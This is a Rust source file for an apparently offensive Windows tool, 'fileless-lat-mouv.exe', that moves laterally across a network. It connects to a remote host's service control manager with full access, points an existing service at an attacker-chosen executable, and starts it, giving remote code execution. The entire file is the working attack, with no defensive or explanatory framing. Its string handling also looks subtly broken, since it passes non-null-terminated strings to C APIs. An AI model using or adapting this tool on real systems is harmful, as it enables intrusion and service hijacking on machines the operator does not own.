use std::{env, ptr};

use windows_sys::core::PCSTR;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::Security::SC_HANDLE;
use windows_sys::Win32::System::Services::ChangeServiceConfigA;
use windows_sys::Win32::System::Services::OpenSCManagerW;
use windows_sys::Win32::System::Services::StartServiceA;
use windows_sys::Win32::System::Services::OpenServiceA;
use windows_sys::Win32::System::Services::{SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 4 {
        println!("Invalid number of args");
        println!("fileless-lat-mouv.exe target targetService application.exe");
        return;
    }
    let target: Vec<u16> = (&args[1]).encode_utf16().collect();
    let service = &args[2].as_str();
    let application = &args[3].as_str();

    let handle: SC_HANDLE =
        unsafe { OpenSCManagerW(target.as_ptr(), ptr::null(), SC_MANAGER_ALL_ACCESS) };
    if handle == 0 {
        println!("OpenSCManagerW failed");
        println!("Error: {}", unsafe { GetLastError() });
        return;
    }
    println!("Connection to service control manager established");

    let svc_handle: SC_HANDLE =
        unsafe { OpenServiceA(handle, service.as_ptr(), SERVICE_ALL_ACCESS) };
    if svc_handle == 0 {
        println!("OpenServiceA failed");
        println!("Error: {}", unsafe { GetLastError() });
        return;
    }
    println!("Connection to service established");

    if unsafe {
        ChangeServiceConfigA(
            svc_handle,
            0xffffffff,
            3,
            0,
            application.as_ptr(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
        )
    } == 0
    {
        println!("ChangeServiceConfigW failed");
        println!("Error: {}", unsafe { GetLastError() });
        return;
    }
    println!("Service config has been changed");
    
    
    if unsafe{ StartServiceA(svc_handle, 0, ptr::null())} == 0 {
        println!("StartServiceA failed");
        println!("Error: {}", unsafe { GetLastError() });
        return;
    }
    println!("Service has been launched");
}
